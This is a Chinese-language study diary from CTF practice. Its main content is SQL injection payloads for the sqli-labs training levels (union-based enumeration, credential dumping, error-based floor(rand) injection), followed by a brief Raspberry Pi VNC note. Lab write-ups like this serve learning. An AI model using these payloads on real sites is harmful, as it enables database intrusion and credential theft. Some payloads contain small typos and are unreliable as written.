# Day3+4  
## 2019/07/10+11
### docker部署lnmp
`sudo docker search ctftraining`  
`sudo docker pull ctftraining/base_image_nginx_mysql_php_73`  
`sudo docker run -dt --name lnmp -p 236:80 --rm ctftraining/base_image_nginx_mysql_php_73`  
嗯  

### sqli-labs 1  
payload:`?id=1' order by 3 --+`   
order by查列（还是字段数），`order by 4`则回显不正常  

payload:`?id=999' union select 1,2,3 --+`  

，发现页面先输出了2和3，说明页面有2个显示位   

然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息  

payload:`?id=999' union select 1,(select_group_concat(schema_name) from information_schema.schemata),3 --+`  

loginname的地方就会显现数据库名  

其中就有一个叫做security的库  

然后把3所在的地方改成`(select group_concat(table_name) from information_schema.tables where table_schema='security')` 

用于查询security内的所有表名  

完整payload:id=999`union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security') --+`   

payload:`select group_concat(column_name) from information_schema.columns where table_name='users'   `


爆出users表下所有列   

payload:  

`select group_concat(password) from security.users`    

`select group_concat(username) from security.users`  

查询密码跟用户名  

`group_concat(table_name) from information_schema.tables where table_schema=database()%23`  

查表名    

### sqli-labs3  

payload:`?id=777')`  

用括号使语句闭合以后再进行注入 


### sqli-labs5

盲注第一篇，琢磨了许久……

主要来自：https://www.freebuf.com/column/158705.html



总之这道题既可以报错盲注又可以布尔盲注

接下来会用到的几个函数

`Count()`计算总数

`Concat()`连接字符串

`Floor()`向下取整数

`Rand()`产生0～1的随机数

`rand(0)`序列是011011  


--------
  
  
`select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;`  
上面的这条SQL将报错: Duplicate entry '1' for key 'group_key'
如下图

![img1](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/1.png)

原因：  

rand(0)是把0作为生成随机数的种子。首先明确一点，无论查询多少次，无论在哪台MySQL Server上查询，连续rand(0)生成的序列是固定的。

![img2](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/2.png)

![img3](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/3.png)


--------

姿势如下：


`union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+`

version()可以替换为需要查询的信息。  

简化语句：  

①`union select 1,2,count(*)  from information_schema.columns group by concat(version(),floor(rand(0)*2));–+`

搞到库名  
![img4](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/4.png)  

②`Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+`  
③`Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+`

搞到表名+列名(跟之前的是一样的，名字是username和password)  

盗过来的脚本最好在linux上跑  



### VNC远程控制树莓派  
`sudo raspi-confi`  

选择`5 Interfacing Options`  

把vnc打开即可远程连接  


### 重置树莓派密码跟用户


